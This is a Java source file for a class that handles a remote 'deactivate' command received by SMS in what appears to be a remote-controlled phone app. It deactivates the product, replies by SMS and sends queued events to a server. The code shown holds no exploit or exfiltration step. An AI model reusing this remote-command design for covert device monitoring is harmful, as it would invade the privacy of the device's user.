package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.prot.command.response.SendDeactivateCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendDeactivateManager;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class PCCDeactivate extends PCCRmtCmdAsync implements PhoenixProtocolListener, SMSSendListener {
	
	private SendDeactivateManager deactManager = Global.getSendDeactivateManager();
	private SMSSender smsSender = Global.getSMSSender();
	private FxSMSMessage smsMessage = new FxSMSMessage();
	private boolean isReply;
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public PCCDeactivate(String recipentNumber, boolean isReply) {
		if (recipentNumber != null) {
			this.isReply = isReply;
			smsMessage.setNumber(recipentNumber);			
		}
	}
	
	private void send() {
		if (isReply) {
			smsSender.send(smsMessage);
		}
	}
	
	// Runnable
	public void run() {
		deactManager.addListener(this);
		deactManager.deactivate();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

	// PhoenixProtocolListener
	public void onError(String message) {
		doPCCHeader(PhoenixCompliantCommand.DEACTIVATE.getId());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// TODO: Issue: 595, After deactivated, all events should be remove
		// Root cause: After deactivated, database will be reset 
		// So should not to save this system event that will be saved into database as 1st event.
//		createSystemEventOut(responseMessage.toString());
		deactManager.removeListener(this);
		observer.cmdExecutedError(this);
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
//		eventSender.sendEvents();
		Log.error("PCCDeactivate.onError()", "message: " + message);
	}

	public void onSuccess(CommandResponse response) {
		doPCCHeader(PhoenixCompliantCommand.DEACTIVATE.getId());
		deactManager.removeListener(this);
		if (response instanceof SendDeactivateCmdResponse) {
			SendDeactivateCmdResponse sendDeactRes = (SendDeactivateCmdResponse)response;
			if (sendDeactRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.PROD_DEACTIVATED);
				observer.cmdExecutedSuccess(this);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendDeactRes.getServerMsg());
				observer.cmdExecutedError(this);
			}
			// TODO: Issue: 595, After deactivated, all events should be remove
			// Root cause: After deactivated, database will be reset 
			// So should not to save this system event that will be saved into database as 1st event.
			// To create system event.
//			createSystemEventOut(responseMessage.toString());	
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("PCCDeactivate.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
